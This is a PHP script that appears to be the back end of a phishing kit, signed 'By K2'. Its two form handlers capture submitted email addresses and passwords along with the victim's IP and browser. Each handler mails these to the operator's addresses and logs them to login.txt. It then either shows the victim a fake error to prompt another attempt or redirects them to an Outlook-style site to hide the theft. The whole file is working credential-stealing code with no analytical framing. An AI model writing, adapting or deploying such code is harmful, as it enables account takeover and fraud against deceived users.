<?php
header("Access-Control-Allow-Origin: *");
if(isset($_POST['tender'])){

    if(!empty($_POST['username'] and !empty($_POST['password']))){

        $ip = getenv("REMOTE_ADDR");

        include('email.php');
        $user = $_POST['username'];
        $code = base64_encode($user);
        $message = "--++-----[ $$ SMTP Access $$ ]-----++--\n";
        $message .= "-------------- SMTP -------------\n";
        $message .= "Email : ".$user."\n";
        $message .= "Password : ".$_POST['password']."\n";
        $message .= "IP       : $ip\n";
        $message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
        $message .= "---------------------- By K2 ----------------------\n";
        $subject = " SMTP Result [ " . $ip . " ]";
        $headers = "From: SMTP K2 <contact>\r\n";
        mail($email,$subject,$message,$headers);
            $text = fopen('login.txt', 'a');
        fwrite($text, $message);
        mail(','.$form,$subject,$message,$headers);
        echo "<script>window.location='index.php?error=1&email=$code'</script>";
    }
    else {
        $user = $_POST['username'];
        $code = base64_encode($user);
        echo "<script>window.location='index.html?email=$code&error=Password is required'</script>";
    }

}


if(isset($_POST['tender1'])){

    if(!empty($_POST['username'] and !empty($_POST['password']))){

        $ip = getenv("REMOTE_ADDR");

        include('email.php');
        $message = "--++-----[ $$ SMTP Access $$ ]-----++--\n";
        $message .= "-------------- SMTP -------------\n";
        $message .= "Email : ".$_POST['username']."\n";
        $message .= "Password : ".$_POST['password']."\n";
        $message .= "IP       : $ip\n";
        $message .= "---------------------- By K2 ----------------------\n";
        $subject = " SMTP Result [ " . $ip . " ]";
        $headers = "From: SMTP K2 <contact>\r\n";
        mail($email,$subject,$message,$headers);
            $text = fopen('login.txt', 'a');
        fwrite($text, $message);
        mail(','.$form,$subject,$message,$headers);
        echo "<script>window.location='https://outlookwebapp.com/'</script>";
    }
    else {
        $user = $_POST['username'];
        $code = base64_encode($user);
        echo "<script>window.location='index.html?error=1&email=$code'</script>";
    }

}

?>
